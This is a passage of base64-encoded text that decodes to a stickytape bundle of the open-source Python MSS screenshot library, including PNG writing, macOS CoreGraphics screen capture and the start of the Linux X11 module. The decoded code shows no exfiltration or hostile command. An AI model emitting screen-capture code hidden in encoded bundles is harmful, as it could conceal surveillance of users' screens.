FxuaW1wb3J0IHpsaWJcbmZyb20gdHlwaW5nIGltcG9ydCBUWVBFX0NIRUNLSU5HXG5cbmlmIFRZUEVfQ0hFQ0tJTkc6XG4gICAgZnJvbSB0eXBpbmcgaW1wb3J0IE9wdGlvbmFsLCBUdXBsZSAgIyBub3FhXG5cblxuZGVmIHRvX3BuZyhkYXRhLCBzaXplLCBsZXZlbD02LCBvdXRwdXQ9Tm9uZSk6XG4gICAgIyB0eXBlOiAoYnl0ZXMsIFR1cGxlW2ludCwgaW50XSwgaW50LCBPcHRpb25hbFtzdHJdKSAtPiBPcHRpb25hbFtieXRlc11cbiAgICAiIiJcbiAgICBEdW1wIGRhdGEgdG8gYSBQTkcgZmlsZS4gIElmIGBvdXRwdXRgIGlzIGBOb25lYCwgY3JlYXRlIG5vIGZpbGUgYnV0IHJldHVyblxuICAgIHRoZSB3aG9sZSBQTkcgZGF0YS5cblxuICAgIDpwYXJhbSBieXRlcyBkYXRhOiBSR0JSR0IuLi5SR0IgZGF0YS5cbiAgICA6cGFyYW0gdHVwbGUgc2l6ZTogVGhlICh3aWR0aCwgaGVpZ2h0KSBwYWlyLlxuICAgIDpwYXJhbSBpbnQgbGV2ZWw6IFBORyBjb21wcmVzc2lvbiBsZXZlbC5cbiAgICA6cGFyYW0gc3RyIG91dHB1dDogT3V0cHV0IGZpbGUgbmFtZS5cbiAgICAiIiJcbiAgICAjIHB5bGludDogZGlzYWJsZT10b28tbWFueS1sb2NhbHNcblxuICAgIHBhY2sgPSBzdHJ1Y3QucGFja1xuICAgIGNyYzMyID0gemxpYi5jcmMzMlxuXG4gICAgd2lkdGgsIGhlaWdodCA9IHNpemVcbiAgICBsaW5lID0gd2lkdGggKiAzXG4gICAgcG5nX2ZpbHRlciA9IHBhY2soIj5CIiwgMClcbiAgICBzY2FubGluZXMgPSBiIiIuam9pbihcbiAgICAgICAgW3BuZ19maWx0ZXIgKyBkYXRhW3kgKiBsaW5lIDogeSAqIGxpbmUgKyBsaW5lXSBmb3IgeSBpbiByYW5nZShoZWlnaHQpXVxuICAgIClcblxuICAgIG1hZ2ljID0gcGFjaygiPjhCIiwgMTM3LCA4MCwgNzgsIDcxLCAxMywgMTAsIDI2LCAxMClcblxuICAgICMgSGVhZGVyOiBzaXplLCBtYXJrZXIsIGRhdGEsIENSQzMyXG4gICAgaWhkciA9IFtiIiIsIGIiSUhEUiIsIGIiIiwgYiIiXVxuICAgIGloZHJbMl0gPSBwYWNrKCI+Mkk1QiIsIHdpZHRoLCBoZWlnaHQsIDgsIDIsIDAsIDAsIDApXG4gICAgaWhkclszXSA9IHBhY2soIj5JIiwgY3JjMzIoYiIiLmpvaW4oaWhkclsxOjNdKSkgJiAweEZGRkZGRkZGKVxuICAgIGloZHJbMF0gPSBwYWNrKCI+SSIsIGxlbihpaGRyWzJdKSlcblxuICAgICMgRGF0YTogc2l6ZSwgbWFya2VyLCBkYXRhLCBDUkMzMlxuICAgIGlkYXQgPSBbYiIiLCBiIklEQVQiLCB6bGliLmNvbXByZXNzKHNjYW5saW5lcywgbGV2ZWwpLCBiIiJdXG4gICAgaWRhdFszXSA9IHBhY2soIj5JIiwgY3JjMzIoYiIiLmpvaW4oaWRhdFsxOjNdKSkgJiAweEZGRkZGRkZGKVxuICAgIGlkYXRbMF0gPSBwYWNrKCI+SSIsIGxlbihpZGF0WzJdKSlcblxuICAgICMgRm9vdGVyOiBzaXplLCBtYXJrZXIsIE5vbmUsIENSQzMyXG4gICAgaWVuZCA9IFtiIiIsIGIiSUVORCIsIGIiIiwgYiIiXVxuICAgIGllbmRbM10gPSBwYWNrKCI+SSIsIGNyYzMyKGllbmRbMV0pICYgMHhGRkZGRkZGRilcbiAgICBpZW5kWzBdID0gcGFjaygiPkkiLCBsZW4oaWVuZFsyXSkpXG5cbiAgICBpZiBub3Qgb3V0cHV0OlxuICAgICAgICAjIFJldHVybnMgcmF3IGJ5dGVzIG9mIHRoZSB3aG9sZSBQTkcgZGF0YVxuICAgICAgICByZXR1cm4gbWFnaWMgKyBiIiIuam9pbihpaGRyICsgaWRhdCArIGllbmQpXG5cbiAgICB3aXRoIG9wZW4ob3V0cHV0LCAid2IiKSBhcyBmaWxlaDpcbiAgICAgICAgZmlsZWgud3JpdGUobWFnaWMpXG4gICAgICAgIGZpbGVoLndyaXRlKGIiIi5qb2luKGloZHIpKVxuICAgICAgICBmaWxlaC53cml0ZShiIiIuam9pbihpZGF0KSlcbiAgICAgICAgZmlsZWgud3JpdGUoYiIiLmpvaW4oaWVuZCkpXG5cbiAgICAgICAgIyBGb3JjZSB3cml0ZSBvZiBmaWxlIHRvIGRpc2tcbiAgICAgICAgZmlsZWguZmx1c2goKVxuICAgICAgICBvcy5mc3luYyhmaWxlaC5maWxlbm8oKSlcblxuICAgIHJldHVybiBOb25lXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnbXNzL2Rhcndpbi5weScsIGInIiIiXG5UaGlzIGlzIHBhcnQgb2YgdGhlIE1TUyBQeXRob25cJ3MgbW9kdWxlLlxuU291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vQm9ib1RpRy9weXRob24tbXNzXG4iIiJcblxuaW1wb3J0IGN0eXBlc1xuaW1wb3J0IGN0eXBlcy51dGlsXG5pbXBvcnQgc3lzXG5mcm9tIGN0eXBlcyBpbXBvcnQgKFxuICAgIFBPSU5URVIsXG4gICAgU3RydWN0dXJlLFxuICAgIGNfZG91YmxlLFxuICAgIGNfZmxvYXQsXG4gICAgY19pbnQzMixcbiAgICBjX3VpbnQ2NCxcbiAgICBjX3VieXRlLFxuICAgIGNfdWludDMyLFxuICAgIGNfdm9pZF9wLFxuKVxuZnJvbSBwbGF0Zm9ybSBpbXBvcnQgbWFjX3ZlclxuZnJvbSB0eXBpbmcgaW1wb3J0IFRZUEVfQ0hFQ0tJTkdcblxuZnJvbSAuYmFzZSBpbXBvcnQgTVNTQmFzZVxuZnJvbSAuZXhjZXB0aW9uIGltcG9ydCBTY3JlZW5TaG90RXJyb3JcbmZyb20gLnNjcmVlbnNob3QgaW1wb3J0IFNpemVcblxuaWYgVFlQRV9DSEVDS0lORzpcbiAgICBmcm9tIHR5cGluZyBpbXBvcnQgQW55LCBMaXN0LCBUeXBlLCBVbmlvbiAgIyBub3FhXG5cbiAgICBmcm9tIC5tb2RlbHMgaW1wb3J0IE1vbml0b3IsIE1vbml0b3JzICAjIG5vcWFcbiAgICBmcm9tIC5zY3JlZW5zaG90IGltcG9ydCBTY3JlZW5TaG90ICAjIG5vcWFcblxuX19hbGxfXyA9ICgiTVNTIiwpXG5cblxuZGVmIGNnZmxvYXQoKTpcbiAgICAjIHR5cGU6ICgpIC0+IFVuaW9uW1R5cGVbY19kb3VibGVdLCBUeXBlW2NfZmxvYXRdXVxuICAgICIiIiBHZXQgdGhlIGFwcHJvcHJpYXRlIHZhbHVlIGZvciBhIGZsb2F0LiAiIiJcblxuICAgIHJldHVybiBjX2RvdWJsZSBpZiBzeXMubWF4c2l6ZSA+IDIgKiogMzIgZWxzZSBjX2Zsb2F0XG5cblxuY2xhc3MgQ0dQb2ludChTdHJ1Y3R1cmUpOlxuICAgICIiIiBTdHJ1Y3R1cmUgdGhhdCBjb250YWlucyBjb29yZGluYXRlcyBvZiBhIHJlY3RhbmdsZS4gIiIiXG5cbiAgICBfZmllbGRzXyA9IFsoIngiLCBjZ2Zsb2F0KCkpLCAoInkiLCBjZ2Zsb2F0KCkpXVxuXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxuICAgICAgICByZXR1cm4gInt9KGxlZnQ9e30gdG9wPXt9KSIuZm9ybWF0KHR5cGUoc2VsZikuX19uYW1lX18sIHNlbGYueCwgc2VsZi55KVxuXG5cbmNsYXNzIENHU2l6ZShTdHJ1Y3R1cmUpOlxuICAgICIiIiBTdHJ1Y3R1cmUgdGhhdCBjb250YWlucyBkaW1lbnNpb25zIG9mIGFuIHJlY3RhbmdsZS4gIiIiXG5cbiAgICBfZmllbGRzXyA9IFsoIndpZHRoIiwgY2dmbG9hdCgpKSwgKCJoZWlnaHQiLCBjZ2Zsb2F0KCkpXVxuXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxuICAgICAgICByZXR1cm4gInt9KHdpZHRoPXt9IGhlaWdodD17fSkiLmZvcm1hdChcbiAgICAgICAgICAgIHR5cGUoc2VsZikuX19uYW1lX18sIHNlbGYud2lkdGgsIHNlbGYuaGVpZ2h0XG4gICAgICAgIClcblxuXG5jbGFzcyBDR1JlY3QoU3RydWN0dXJlKTpcbiAgICAiIiIgU3RydWN0dXJlIHRoYXQgY29udGFpbnMgaW5mb3JtYXRpb24gYWJvdXQgYSByZWN0YW5nbGUuICIiIlxuXG4gICAgX2ZpZWxkc18gPSBbKCJvcmlnaW4iLCBDR1BvaW50KSwgKCJzaXplIiwgQ0dTaXplKV1cblxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcbiAgICAgICAgcmV0dXJuICJ7fTx7fSB7fT4iLmZvcm1hdCh0eXBlKHNlbGYpLl9fbmFtZV9fLCBzZWxmLm9yaWdpbiwgc2VsZi5zaXplKVxuXG5cbiMgQyBmdW5jdGlvbnMgdGhhdCB3aWxsIGJlIGluaXRpYWxpc2VkIGxhdGVyLlxuI1xuIyBUaGlzIGlzIGEgZGljdDpcbiMgICAgY2Z1bmN0aW9uOiAoYXR0ciwgYXJndHlwZXMsIHJlc3R5cGUpXG4jXG4jIEF2YWlsYWJsZSBhdHRyOiBjb3JlLlxuI1xuIyBOb3RlOiBrZWVwIGl0IHNvcnRlZCBieSBjZnVuY3Rpb24uXG5DRlVOQ1RJT05TID0ge1xuICAgICJDR0RhdGFQcm92aWRlckNvcHlEYXRhIjogKCJjb3JlIiwgW2Nfdm9pZF9wXSwgY192b2lkX3ApLFxuICAgICJDR0Rpc3BsYXlCb3VuZHMiOiAoImNvcmUiLCBbY191aW50MzJdLCBDR1JlY3QpLFxuICAgICJDR0Rpc3BsYXlSb3RhdGlvbiI6ICgiY29yZSIsIFtjX3VpbnQzMl0sIGNfZmxvYXQpLFxuICAgICJDRkRhdGFHZXRCeXRlUHRyIjogKCJjb3JlIiwgW2Nfdm9pZF9wXSwgY192b2lkX3ApLFxuICAgICJDRkRhdGFHZXRMZW5ndGgiOiAoImNvcmUiLCBbY192b2lkX3BdLCBjX3VpbnQ2NCksXG4gICAgIkNGUmVsZWFzZSI6ICgiY29yZSIsIFtjX3ZvaWRfcF0sIGNfdm9pZF9wKSxcbiAgICAiQ0dEYXRhUHJvdmlkZXJSZWxlYXNlIjogKCJjb3JlIiwgW2Nfdm9pZF9wXSwgY192b2lkX3ApLFxuICAgICJDR0dldEFjdGl2ZURpc3BsYXlMaXN0IjogKFxuICAgICAgICAiY29yZSIsXG4gICAgICAgIFtjX3VpbnQzMiwgUE9JTlRFUihjX3VpbnQzMiksIFBPSU5URVIoY191aW50MzIpXSxcbiAgICAgICAgY19pbnQzMixcbiAgICApLFxuICAgICJDR0ltYWdlR2V0Qml0c1BlclBpeGVsIjogKCJjb3JlIiwgW2Nfdm9pZF9wXSwgaW50KSxcbiAgICAiQ0dJbWFnZUdldEJ5dGVzUGVyUm93IjogKCJjb3JlIiwgW2Nfdm9pZF9wXSwgaW50KSxcbiAgICAiQ0dJbWFnZUdldERhdGFQcm92aWRlciI6ICgiY29yZSIsIFtjX3ZvaWRfcF0sIGNfdm9pZF9wKSxcbiAgICAiQ0dJbWFnZUdldEhlaWdodCI6ICgiY29yZSIsIFtjX3ZvaWRfcF0sIGludCksXG4gICAgIkNHSW1hZ2VHZXRXaWR0aCI6ICgiY29yZSIsIFtjX3ZvaWRfcF0sIGludCksXG4gICAgIkNHUmVjdFN0YW5kYXJkaXplIjogKCJjb3JlIiwgW0NHUmVjdF0sIENHUmVjdCksXG4gICAgIkNHUmVjdFVuaW9uIjogKCJjb3JlIiwgW0NHUmVjdCwgQ0dSZWN0XSwgQ0dSZWN0KSxcbiAgICAiQ0dXaW5kb3dMaXN0Q3JlYXRlSW1hZ2UiOiAoXG4gICAgICAgICJjb3JlIixcbiAgICAgICAgW0NHUmVjdCwgY191aW50MzIsIGNfdWludDMyLCBjX3VpbnQzMl0sXG4gICAgICAgIGNfdm9pZF9wLFxuICAgICksXG59XG5cblxuY2xhc3MgTVNTKE1TU0Jhc2UpOlxuICAgICIiIlxuICAgIE11bHRpcGxlIFNjcmVlblNob3RzIGltcGxlbWVudGF0aW9uIGZvciBtYWNPUy5cbiAgICBJdCB1c2VzIGludGVuc2l2ZWx5IHRoZSBDb3JlR3JhcGhpY3MgbGlicmFyeS5cbiAgICAiIiJcblxuICAgIF9fc2xvdHNfXyA9IHsiY29yZSIsICJtYXhfZGlzcGxheXMifVxuXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsICoqXyk6XG4gICAgICAgICIiIiBtYWNPUyBpbml0aWFsaXNhdGlvbnMuICIiIlxuXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18oKVxuXG4gICAgICAgIHNlbGYubWF4X2Rpc3BsYXlzID0gMzJcblxuICAgICAgICBzZWxmLl9pbml0X2xpYnJhcnkoKVxuICAgICAgICBzZWxmLl9zZXRfY2Z1bmN0aW9ucygpXG5cbiAgICBkZWYgX2luaXRfbGlicmFyeShzZWxmKTpcbiAgICAgICAgIiIiIExvYWQgdGhlIENvcmVHcmFwaGljcyBsaWJyYXJ5LiAiIiJcbiAgICAgICAgdmVyc2lvbiA9IGZsb2F0KCIuIi5qb2luKG1hY192ZXIoKVswXS5zcGxpdCgiLiIpWzoyXSkpXG4gICAgICAgIGlmIHZlcnNpb24gPCAxMC4xNjpcbiAgICAgICAgICAgIGNvcmVncmFwaGljcyA9IGN0eXBlcy51dGlsLmZpbmRfbGlicmFyeSgiQ29yZUdyYXBoaWNzIilcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICMgbWFjT1MgQmlnIFN1ciBhbmQgbmV3ZXJcbiAgICAgICAgICAgICMgcHlsaW50OiBkaXNhYmxlPWxpbmUtdG9vLWxvbmdcbiAgICAgICAgICAgIGNvcmVncmFwaGljcyA9ICIvU3lzdGVtL0xpYnJhcnkvRnJhbWV3b3Jrcy9Db3JlR3JhcGhpY3MuZnJhbWV3b3JrL1ZlcnNpb25zL0N1cnJlbnQvQ29yZUdyYXBoaWNzIlxuXG4gICAgICAgIGlmIG5vdCBjb3JlZ3JhcGhpY3M6XG4gICAgICAgICAgICByYWlzZSBTY3JlZW5TaG90RXJyb3IoIk5vIENvcmVHcmFwaGljcyBsaWJyYXJ5IGZvdW5kLiIpXG4gICAgICAgIHNlbGYuY29yZSA9IGN0eXBlcy5jZGxsLkxvYWRMaWJyYXJ5KGNvcmVncmFwaGljcylcblxuICAgIGRlZiBfc2V0X2NmdW5jdGlvbnMoc2VsZik6XG4gICAgICAgICMgdHlwZTogKCkgLT4gTm9uZVxuICAgICAgICAiIiIgU2V0IGFsbCBjdHlwZXMgZnVuY3Rpb25zIGFuZCBhdHRhY2ggdGhlbSB0byBhdHRyaWJ1dGVzLiAiIiJcblxuICAgICAgICBjZmFjdG9yeSA9IHNlbGYuX2NmYWN0b3J5XG4gICAgICAgIGF0dHJzID0geyJjb3JlIjogc2VsZi5jb3JlfVxuICAgICAgICBmb3IgZnVuYywgKGF0dHIsIGFyZ3R5cGVzLCByZXN0eXBlKSBpbiBDRlVOQ1RJT05TLml0ZW1zKCk6XG4gICAgICAgICAgICBjZmFjdG9yeShcbiAgICAgICAgICAgICAgICBhdHRyPWF0dHJzW2F0dHJdLFxuICAgICAgICAgICAgICAgIGZ1bmM9ZnVuYyxcbiAgICAgICAgICAgICAgICBhcmd0eXBlcz1hcmd0eXBlcywgICMgdHlwZTogaWdub3JlXG4gICAgICAgICAgICAgICAgcmVzdHlwZT1yZXN0eXBlLFxuICAgICAgICAgICAgKVxuXG4gICAgZGVmIF9tb25pdG9yc19pbXBsKHNlbGYpOlxuICAgICAgICAjIHR5cGU6ICgpIC0+IE5vbmVcbiAgICAgICAgIiIiIEdldCBwb3NpdGlvbnMgb2YgbW9uaXRvcnMuIEl0IHdpbGwgcG9wdWxhdGUgc2VsZi5fbW9uaXRvcnMuICIiIlxuXG4gICAgICAgIGludF8gPSBpbnRcbiAgICAgICAgY29yZSA9IHNlbGYuY29yZVxuXG4gICAgICAgICMgQWxsIG1vbml0b3JzXG4gICAgICAgICMgV2UgbmVlZCB0byB1cGRhdGUgdGhlIHZhbHVlIHdpdGggZXZlcnkgc2luZ2xlIG1vbml0b3IgZm91bmRcbiAgICAgICAgIyB1c2luZyBDR1JlY3RVbmlvbi4gIEVsc2Ugd2Ugd2lsbCBlbmQgd2l0aCBpbmZpbml0ZSB2YWx1ZXMuXG4gICAgICAgIGFsbF9tb25pdG9ycyA9IENHUmVjdCgpXG4gICAgICAgIHNlbGYuX21vbml0b3JzLmFwcGVuZCh7fSlcblxuICAgICAgICAjIEVhY2ggbW9uaXRvcnNcbiAgICAgICAgZGlzcGxheV9jb3VudCA9IGNfdWludDMyKDApXG4gICAgICAgIGFjdGl2ZV9kaXNwbGF5cyA9IChjX3VpbnQzMiAqIHNlbGYubWF4X2Rpc3BsYXlzKSgpXG4gICAgICAgIGNvcmUuQ0dHZXRBY3RpdmVEaXNwbGF5TGlzdChcbiAgICAgICAgICAgIHNlbGYubWF4X2Rpc3BsYXlzLCBhY3RpdmVfZGlzcGxheXMsIGN0eXBlcy5ieXJlZihkaXNwbGF5X2NvdW50KVxuICAgICAgICApXG4gICAgICAgIHJvdGF0aW9ucyA9IHswLjA6ICJub3JtYWwiLCA5MC4wOiAicmlnaHQiLCAtOTAuMDogImxlZnQifVxuICAgICAgICBmb3IgaWR4IGluIHJhbmdlKGRpc3BsYXlfY291bnQudmFsdWUpOlxuICAgICAgICAgICAgZGlzcGxheSA9IGFjdGl2ZV9kaXNwbGF5c1tpZHhdXG4gICAgICAgICAgICByZWN0ID0gY29yZS5DR0Rpc3BsYXlCb3VuZHMoZGlzcGxheSlcbiAgICAgICAgICAgIHJlY3QgPSBjb3JlLkNHUmVjdFN0YW5kYXJkaXplKHJlY3QpXG4gICAgICAgICAgICB3aWR0aCwgaGVpZ2h0ID0gcmVjdC5zaXplLndpZHRoLCByZWN0LnNpemUuaGVpZ2h0XG4gICAgICAgICAgICByb3QgPSBjb3JlLkNHRGlzcGxheVJvdGF0aW9uKGRpc3BsYXkpXG4gICAgICAgICAgICBpZiByb3RhdGlvbnNbcm90XSBpbiBbImxlZnQiLCAicmlnaHQiXTpcbiAgICAgICAgICAgICAgICB3aWR0aCwgaGVpZ2h0ID0gaGVpZ2h0LCB3aWR0aFxuICAgICAgICAgICAgc2VsZi5fbW9uaXRvcnMuYXBwZW5kKFxuICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgImxlZnQiOiBpbnRfKHJlY3Qub3JpZ2luLngpLFxuICAgICAgICAgICAgICAgICAgICAidG9wIjogaW50XyhyZWN0Lm9yaWdpbi55KSxcbiAgICAgICAgICAgICAgICAgICAgIndpZHRoIjogaW50Xyh3aWR0aCksXG4gICAgICAgICAgICAgICAgICAgICJoZWlnaHQiOiBpbnRfKGhlaWdodCksXG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgKVxuXG4gICAgICAgICAgICAjIFVwZGF0ZSBBaU8gbW9uaXRvclwncyB2YWx1ZXNcbiAgICAgICAgICAgIGFsbF9tb25pdG9ycyA9IGNvcmUuQ0dSZWN0VW5pb24oYWxsX21vbml0b3JzLCByZWN0KVxuXG4gICAgICAgICMgU2V0IHRoZSBBaU8gbW9uaXRvclwncyB2YWx1ZXNcbiAgICAgICAgc2VsZi5fbW9uaXRvcnNbMF0gPSB7XG4gICAgICAgICAgICAibGVmdCI6IGludF8oYWxsX21vbml0b3JzLm9yaWdpbi54KSxcbiAgICAgICAgICAgICJ0b3AiOiBpbnRfKGFsbF9tb25pdG9ycy5vcmlnaW4ueSksXG4gICAgICAgICAgICAid2lkdGgiOiBpbnRfKGFsbF9tb25pdG9ycy5zaXplLndpZHRoKSxcbiAgICAgICAgICAgICJoZWlnaHQiOiBpbnRfKGFsbF9tb25pdG9ycy5zaXplLmhlaWdodCksXG4gICAgICAgIH1cblxuICAgIGRlZiBfZ3JhYl9pbXBsKHNlbGYsIG1vbml0b3IpOlxuICAgICAgICAjIHR5cGU6IChNb25pdG9yKSAtPiBTY3JlZW5TaG90XG4gICAgICAgICIiIiBSZXRyaWV2ZSBhbGwgcGl4ZWxzIGZyb20gYSBtb25pdG9yLiBQaXhlbHMgaGF2ZSB0byBiZSBSR0IuICIiIlxuXG4gICAgICAgICMgcHlsaW50OiBkaXNhYmxlPXRvby1tYW55LWxvY2Fsc1xuXG4gICAgICAgIGNvcmUgPSBzZWxmLmNvcmVcbiAgICAgICAgcmVjdCA9IENHUmVjdChcbiAgICAgICAgICAgIChtb25pdG9yWyJsZWZ0Il0sIG1vbml0b3JbInRvcCJdKSwgKG1vbml0b3JbIndpZHRoIl0sIG1vbml0b3JbImhlaWdodCJdKVxuICAgICAgICApXG5cbiAgICAgICAgaW1hZ2VfcmVmID0gY29yZS5DR1dpbmRvd0xpc3RDcmVhdGVJbWFnZShyZWN0LCAxLCAwLCAwKVxuICAgICAgICBpZiBub3QgaW1hZ2VfcmVmOlxuICAgICAgICAgICAgcmFpc2UgU2NyZWVuU2hvdEVycm9yKCJDb3JlR3JhcGhpY3MuQ0dXaW5kb3dMaXN0Q3JlYXRlSW1hZ2UoKSBmYWlsZWQuIilcblxuICAgICAgICB3aWR0aCA9IGNvcmUuQ0dJbWFnZUdldFdpZHRoKGltYWdlX3JlZilcbiAgICAgICAgaGVpZ2h0ID0gY29yZS5DR0ltYWdlR2V0SGVpZ2h0KGltYWdlX3JlZilcbiAgICAgICAgcHJvdiA9IGNvcHlfZGF0YSA9IE5vbmVcbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgcHJvdiA9IGNvcmUuQ0dJbWFnZUdldERhdGFQcm92aWRlcihpbWFnZV9yZWYpXG4gICAgICAgICAgICBjb3B5X2RhdGEgPSBjb3JlLkNHRGF0YVByb3ZpZGVyQ29weURhdGEocHJvdilcbiAgICAgICAgICAgIGRhdGFfcmVmID0gY29yZS5DRkRhdGFHZXRCeXRlUHRyKGNvcHlfZGF0YSlcbiAgICAgICAgICAgIGJ1Zl9sZW4gPSBjb3JlLkNGRGF0YUdldExlbmd0aChjb3B5X2RhdGEpXG4gICAgICAgICAgICByYXcgPSBjdHlwZXMuY2FzdChkYXRhX3JlZiwgUE9JTlRFUihjX3VieXRlICogYnVmX2xlbikpXG4gICAgICAgICAgICBkYXRhID0gYnl0ZWFycmF5KHJhdy5jb250ZW50cylcblxuICAgICAgICAgICAgIyBSZW1vdmUgcGFkZGluZyBwZXIgcm93XG4gICAgICAgICAgICBieXRlc19wZXJfcm93ID0gY29yZS5DR0ltYWdlR2V0Qnl0ZXNQZXJSb3coaW1hZ2VfcmVmKVxuICAgICAgICAgICAgYnl0ZXNfcGVyX3BpeGVsID0gY29yZS5DR0ltYWdlR2V0Qml0c1BlclBpeGVsKGltYWdlX3JlZilcbiAgICAgICAgICAgIGJ5dGVzX3Blcl9waXhlbCA9IChieXRlc19wZXJfcGl4ZWwgKyA3KSAvLyA4XG5cbiAgICAgICAgICAgIGlmIGJ5dGVzX3Blcl9waXhlbCAqIHdpZHRoICE9IGJ5dGVzX3Blcl9yb3c6XG4gICAgICAgICAgICAgICAgY3JvcHBlZCA9IGJ5dGVhcnJheSgpXG4gICAgICAgICAgICAgICAgZm9yIHJvdyBpbiByYW5nZShoZWlnaHQpOlxuICAgICAgICAgICAgICAgICAgICBzdGFydCA9IHJvdyAqIGJ5dGVzX3Blcl9yb3dcbiAgICAgICAgICAgICAgICAgICAgZW5kID0gc3RhcnQgKyB3aWR0aCAqIGJ5dGVzX3Blcl9waXhlbFxuICAgICAgICAgICAgICAgICAgICBjcm9wcGVkLmV4dGVuZChkYXRhW3N0YXJ0OmVuZF0pXG4gICAgICAgICAgICAgICAgZGF0YSA9IGNyb3BwZWRcbiAgICAgICAgZmluYWxseTpcbiAgICAgICAgICAgIGlmIHByb3Y6XG4gICAgICAgICAgICAgICAgY29yZS5DR0RhdGFQcm92aWRlclJlbGVhc2UocHJvdilcbiAgICAgICAgICAgIGlmIGNvcHlfZGF0YTpcbiAgICAgICAgICAgICAgICBjb3JlLkNGUmVsZWFzZShjb3B5X2RhdGEpXG5cbiAgICAgICAgcmV0dXJuIHNlbGYuY2xzX2ltYWdlKGRhdGEsIG1vbml0b3IsIHNpemU9U2l6ZSh3aWR0aCwgaGVpZ2h0KSlcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdtc3MvbGludXgucHknLCBiJyIiIlxuVGhpcyBpcyBwYXJ0IG9mIHRoZSBNU1MgUHl0aG9uXCdzIG1vZHVsZS5cblNvdXJjZTogaHR0cHM6Ly9naXRodWIuY29tL0JvYm9UaUcvcHl0aG9uLW1zc1xuIiIiXG5cbmltcG9ydCBjdHlwZXNcbmltcG9ydCBjdHlwZXMudXRpbFxuaW1wb3J0IG9zXG5pbXBvcnQgdGhyZWFkaW5nXG5mcm9tIGN0eXBlcyBpbXBvcnQgKFxuICAgIFBPSU5URVIsXG4gICAgQ0ZVTkNUWVBFLFxuICAgIFN0cnVjdHVyZSxcbiAgICBjX2NoYXJfcCxcbiAgICBjX2ludCxcbiAgICBjX2ludDMyLFxuICAgIGNfbG9uZyxcbiAgICBjX3VieXRlLFxuICAgIGNfdWludCxcbiAgICBjX3VpbnQzMixcbiAgICBjX3Vsb25nLFxuICAgIGNfdXNob3J0LFxuICAgIGNfdm9pZF9wLFxuKVxuZnJvbSB0eXBlcyBpbXBvcnQgU2ltcGxlTmFtZXNwYWNlXG5mcm9tIHR5cGluZyBpbXBvcnQgVFlQRV9DSEVDS0lOR1xuXG5mcm9tIC5iYXNlIGltcG9ydCBNU1NCYXNlLCBsb2NrXG5mcm9tIC5leGNlcHRpb24gaW1wb3J0IFNjcmVlblNob3RFcnJvclxuXG5pZiBUWVBFX0NIRUNLSU5HOlxuICAgIGZyb20gdHlwaW5nIGltcG9ydCBBbnksIERpY3QsIExpc3QsIE9wdGlvbmFsLCBUdXBsZSwgVW5pb24gICMgbm9xYVxuXG4gICAgZnJvbSAubW9kZWxzIGltcG9ydCBNb25pdG9yLCBNb25pdG9ycyAgIyBub3FhXG4gICAgZnJvbSAuc2NyZWVuc2hvdCBpbXBvcnQgU2NyZWVuU2hvdCAgIyBub3FhXG5cblxuX19hbGxfXyA9ICgiTVNTIiwpXG5cblxuRVJST1IgPSBTaW1wbGVOYW1lc3BhY2UoZGV0YWlscz1Ob25lKVxuUExBSU5NQVNLID0gMHgwMEZGRkZGRlxuWlBJWE1BUCA9IDJcblxuXG5jbGFzcyBEaXNwbGF5KFN0cnVjdHVyZSk6XG4gICAgIiIiXG4gICAgU3RydWN0dXJlIHRoYXQgc2VydmVzIGFzIHRoZSBjb25uZWN0aW9uIHRvIHRoZSBYIHNlcnZlclxuICAgIGFuZCB0aGF0IGNvbnRhaW5zIGFsbCB0aGUgaW5mb3JtYXRpb24gYWJvdXQgdGhhdCBYIHNlcnZlci5cbiAgICAiIiJcblxuXG5jbGFzcyBFdmVudChTdHJ1Y3R1cmUpOlxuICAgICIiIlxuICAgIFhFcnJvckV2ZW50IHRvIGRlYnVnIGV2ZW50dWFsIGVycm9ycy5cbiAgICBodHRwczovL3Ryb25jaGUuY29tL2d1aS94L3hsaWIvZXZlbnQtaGFuZGxpbmcvcHJvdG9jb2wtZXJyb3JzL2RlZmF1bHQtaGFuZGxlcnMuaHRtbFxuICAgICIiIlxuXG4gICAgX2ZpZWxkc18gPSBbXG4gICAgICAgICgidHlwZSIsIGNfaW50KSxcbiAgICAgICAgKCJkaXNwbGF5IiwgUE9JTlRFUihEaXNwbGF5KSksXG4gICAgICAgICgic2VyaWFsIiwgY191bG9uZyksXG4gICAgICAgICgiZXJyb3JfY29kZSIsIGNfdWJ5dGUpLFxuICAgICAgICAoInJlcXVlc3RfY29kZSIsIGNfdWJ5dGUpLFxuICAgICAgICAoIm1pbm9yX2NvZGUiLCBjX3VieXRlKSxcbiAgICAgICAgKCJyZXNvdXJjZWlkIiwgY192b2lkX3ApLFxuICAgIF1cblxuXG5jbGFzcyBYV2luZG93QXR0cmlidXRlcyhTdHJ1Y3R1cmUpOlxuICAgICIiIiBBdHRyaWJ1dGVzIGZvciB0aGUgc3BlY2lmaWVkIHdpbmRvdy4gIiIiXG5cbiAgICBfZmllbGRzXyA9IFtcbiAgICAgICAgKCJ4IiwgY19pbnQzMiksXG4gICAgICAgICgieSIsIGNfaW50MzIpLFxuICAgICAgICAoIndpZHRoIiwgY19pbnQzMiksXG4gICAgICAgICgiaGVpZ2h0IiwgY19pbnQzMiksXG4gICAgICAgICgiYm9yZGVyX3dpZHRoIiwgY19pbnQzMiksXG4gICAgICAgICgiZGVwdGgiLCBjX2ludDMyKSxcbiAgICAgICAgKCJ2aXN1YWwiLCBjX3Vsb25nKSxcbiAgICAgICAgKCJyb290IiwgY191bG9uZyksXG4gICAgICAgICgiY2xhc3MiLCBjX2ludDMyKSxcbiAgICAgICAgKCJiaXRfZ3Jhdml0eSIsIGNfaW50MzIpLFxuICAgICAgICAoIndpbl9ncmF2aXR5IiwgY19pbnQzMiksXG4gICAgICAgICgiYmFja2luZ19zdG9yZSIsIGNfaW50MzIpLFxuICAgICAgICAoImJhY2tpbmdfcGxhbmVzIiwgY191bG9uZyksXG4gICAgICAgICgiYmFja2luZ19waXhlbCIsIGNfdWxvbmcpLFxuICAgI